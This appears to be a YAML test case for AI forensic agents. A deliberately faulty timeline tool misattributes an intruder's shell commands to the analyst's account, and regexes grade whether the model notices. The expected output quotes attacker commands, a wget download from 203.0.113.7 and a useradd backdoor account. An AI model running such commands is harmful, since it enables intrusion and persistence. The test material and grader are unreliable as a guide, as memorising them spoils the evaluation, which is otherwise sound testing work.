steps:
  - tool: build_timeline
    note_ko: "결함 호출: 분석가 홈 아래의 사건 폴더로 타임라인을 만듦"
    args:
      evidence_root: ${EVIDENCE}/home/sansforensics/findevil/evidence/web-prod-02
expect:
  - step: 1
    note_ko: "deploy 셸의 `wget` 명령 사용자가 `sansforensics`로 나온다"
    regex: "\\| bash_history \\| `sansforensics` \\| shell_command \\| wget -q http://203\\.0\\.113\\.7/k"
  - step: 1
    note_ko: "root 셸의 `useradd` 명령 사용자도 `sansforensics`로 나온다"
    regex: "\\| bash_history \\| `sansforensics` \\| shell_command \\| useradd -m"
  - step: 1
    note_ko: "실제 소유자인 `deploy`·`alice`·`root`는 셸 명령의 사용자로 나오지 않는다"
    not_regex: "`(deploy|alice|root)` \\| shell_command"
model:
  # The question an analyst asks of any intrusion: what happened and under
  # which account. Nothing about paths or the timeline's actor column.
  question: >-
    The Ubuntu web server web-prod-02 was compromised around 2026-04-14. Its
    collected evidence is in ${EVIDENCE}/home/sansforensics/findevil/evidence/web-prod-02.
    Reconstruct the attacker's activity in order, and say which local user
    account ran each of the attacker's shell commands.
  question_ko: "Ubuntu 웹 서버 web-prod-02가 2026-04-14 무렵 침해되었다. 수집한 증거는 ${EVIDENCE}/home/sansforensics/findevil/evidence/web-prod-02에 있다. 공격자의 행위를 순서대로 재구성하고, 공격자의 셸 명령을 각각 어느 로컬 사용자 계정이 실행했는지 말해 달라."
  defect_tools: [build_timeline]
  # the defective response: shell commands attributed to the analyst's account
  defect_response: "\\| bash_history \\| `sansforensics` \\| shell_command \\|"
  repeat: 3
  misled_if: all
  # Misled: the answer names sansforensics as the account behind the commands
  # and never says that name is not an account of the host (a path artifact).
  # The case path itself (/home/sansforensics/...) is not counted.
  expect:
    - regex: "(?i)(?<!/)sansforensics(?!/)"
      note_ko: "답이 `sansforensics`를 명령 실행 계정으로 든다"
    - not_regex: "(?i)(?<!/)sansforensics(?!/)[^\\n]{0,200}(not (a |an )?(real |local |valid )?(user|account)|does ?n[o']t exist|not (present |listed )?in (/etc/)?passwd|no such (user|account)|analyst|examiner|workstation|artifact|path|mislabel|misattribut|incorrect|wrong|parsing)|(artifact|mislabel|misattribut|incorrect(ly)?|wrong(ly)?|analyst|examiner|workstation|path)[^\\n]{0,200}(?<!/)sansforensics(?!/)"
      note_ko: "`sansforensics`가 호스트에 없는 계정(경로에서 온 잘못된 이름)이라고 밝히지 않는다"
